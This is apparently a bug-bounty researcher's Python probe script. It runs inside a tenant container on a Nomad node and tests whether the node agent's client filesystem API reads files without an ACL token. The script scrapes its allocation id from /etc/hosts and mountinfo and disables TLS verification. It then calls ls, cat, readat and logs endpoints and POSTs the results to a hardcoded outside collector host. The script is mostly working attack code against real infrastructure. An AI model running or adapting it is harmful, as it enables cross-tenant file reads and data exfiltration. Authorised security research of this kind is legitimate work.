#!/usr/bin/env python3
"""probe18 - the decisive test: is the node's client-filesystem API usable WITHOUT a token?

Source (command/agent/http.go):  s.mux.Handle("/v1/client/fs/", wrapCORS(s.wrap(s.FsRequest)))
Source (command/agent/fs_endpoint.go): FsRequest dispatches on the path suffix - ls/stat/readat/cat/
stream/logs each take the allocation id as a PATH segment, not a query param (my earlier query-param
call returned ErrInvalidMethod, which is what sent me back to the source).

This API is the remote file-read primitive across allocations on the node - the reason Nomad's ACL
exists. It is called here against the node's agent from inside our own allocation, with our own
allocation id, with NO token. If it answers 200, any tenant container can read files out of any
allocation on that node. If it answers 403, authorisation holds and the exposure stays informational.
"""
from __future__ import annotations

import json
import os
import re
import socket
import ssl
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt18"
NODE = "169.254.1.2"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
RESULTS = {"stage": "init", "alloc": {}, "fs": {}, "control": {}}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def sh(cmd, t=15):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=t)
        return (r.stdout + r.stderr).decode("utf-8", "replace").strip()[:400]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


def api(path, method="GET", timeout=8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((NODE, 4646))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=NODE)
        t.sendall(("%s %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n" % (method, path, NODE, UA)).encode())
        d = b""
        while len(d) < 2500:
            try:
                c = t.recv(1500)
            except socket.timeout:
                break
            if not c:
                break
            d += c
        t.close()
        return d.decode("latin1", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, str(e)[:50])


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

# our own allocation id, from the mount path /opt/nomad/data/alloc/<id>/alloc
RESULTS["alloc"]["hostname"] = os.uname().nodename if hasattr(os, "uname") else ""
RESULTS["alloc"]["hosts"] = sh("cat /etc/hosts")
m = re.search(r"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})", RESULTS["alloc"]["hosts"])
alloc = m.group(1) if m else ""
RESULTS["alloc"]["id_guess"] = alloc
RESULTS["alloc"]["mountinfo"] = sh("grep -o 'alloc/[0-9a-f-]\\{36\\}' /proc/self/mountinfo | head -3")

TESTS = [
    "/v1/client/fs/ls/%s?path=/" % alloc,
    "/v1/client/fs/ls/%s?path=/etc" % alloc,
    "/v1/client/fs/stat/%s?path=/etc/hostname" % alloc,
    "/v1/client/fs/cat/%s?path=/etc/hostname" % alloc,
    "/v1/client/fs/readat/%s?path=/etc/hostname&offset=0&limit=64" % alloc,
    "/v1/client/fs/logs/%s?type=stdout&origin=end" % alloc,
    "/v1/client/allocation/%s" % alloc,
    "/v1/client/fs/ls/11111111-1111-1111-1111-111111111111?path=/",
]
for p in TESTS:
    r = api(p)
    RESULTS["fs"][p[:70]] = "%s :: %s" % (r.split("\r\n")[0], r.split("\r\n\r\n", 1)[-1][:220].replace("\n", " "))

RESULTS["control"] = {
    "agent/self (no token)": api("/v1/agent/self").split("\r\n")[0],
    "status/leader (no token)": api("/v1/status/leader").split("\r\n")[0],
}

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS, indent=1)[:4000])
while True:
    time.sleep(60)
